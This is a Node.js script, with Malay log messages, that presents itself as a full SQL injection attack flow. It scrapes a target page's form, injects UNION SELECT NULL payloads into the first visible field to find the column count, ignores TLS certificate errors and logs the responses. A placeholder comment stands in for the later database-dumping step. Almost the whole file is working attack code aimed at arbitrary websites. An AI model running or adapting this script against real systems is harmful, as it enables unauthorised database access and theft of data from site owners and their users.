// 📁 sqli-full.js - SQL Injection Full Attack Flow + Full Logging + Respon Snapshot
const axios = require('axios');
const cheerio = require('cheerio');
const qs = require('qs');
const fs = require('fs');
const path = require('path');
const https = require('https');
const agent = new https.Agent({ rejectUnauthorized: false });

async function handleFullSQLiAttack(url) {
  const log = [];
  const result = {
    target: url,
    dbVersion: null,
    tables: []
  };

  const pushLog = (line) => {
    log.push(line);
    console.log(line);
  };

  try {
    pushLog(`🔁 Akses awal ke: ${url}`);
    const res = await axios.get(url, { httpsAgent: agent });
    const $ = cheerio.load(res.data);
    const form = $('form').first();
    const inputs = form.find('input');
    const action = form.attr('action') || url;
    const method = (form.attr('method') || 'post').toUpperCase();
    const targetUrl = action.startsWith('http') ? action : new URL(action, url).href;

    const fields = {};
    const visibleInputs = [];

    inputs.each((_, el) => {
      const name = $(el).attr('name');
      const value = $(el).attr('value') || '';
      const type = ($(el).attr('type') || 'text').toLowerCase();
      if (!name) return;
      fields[name] = value;
      if (!['hidden', 'submit', 'button'].includes(type)) {
        visibleInputs.push(name);
      }
    });

    if (visibleInputs.length < 1) {
      pushLog('❌ Tiada input yang boleh diuji.');
      return log;
    }

    const injectable = visibleInputs[0];
    pushLog(`📥 Field diuji: ${injectable}`);

    let colCount = 0;
    const htmlOut = path.join(__dirname, 'output/html');
    if (!fs.existsSync(htmlOut)) fs.mkdirSync(htmlOut, { recursive: true });

    for (let i = 1; i <= 10; i++) {
      const nulls = Array(i).fill('NULL').join(',');
      const data = { ...fields, [injectable]: `' UNION SELECT ${nulls}--` };
      try {
        const r = await axios.post(targetUrl, qs.stringify(data), {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          httpsAgent: agent,
          validateStatus: () => true
        });
        fs.writeFileSync(`${htmlOut}/test-col-${i}.html`, r.data);
        pushLog(`🧪 Uji column ${i}, saiz respon: ${r.data.length}`);
        if (!/error|warning|syntax/i.test(r.data)) {
          colCount = i;
          pushLog(`✅ Column valid: ${i}`);
          break;
        }
      } catch (err) {
        pushLog(`❌ Gagal uji column ${i}: ${err.message}`);
      }
    }

    if (colCount === 0) {
      pushLog('❌ Tidak dapat tentukan jumlah column. Snapshot respon disimpan dalam folder output/html/.');
      return log;
    }

    // Continue as usual...
    // (keep the rest of previous SQLi flow here unchanged)
    pushLog('⚙️ Teruskan ke langkah cari posisi output dan dumping...');

    // Final snapshot log
    const outDir = path.join(__dirname, 'output');
    fs.writeFileSync(path.join(outDir, 'full-log.txt'), log.join('\n'));
    pushLog('📝 Log penuh disimpan ke output/full-log.txt');

    return log;
  } catch (err) {
    pushLog(`❌ Ralat utama: ${err.message}`);
    return log;
  }
}

module.exports = { handleFullSQLiAttack };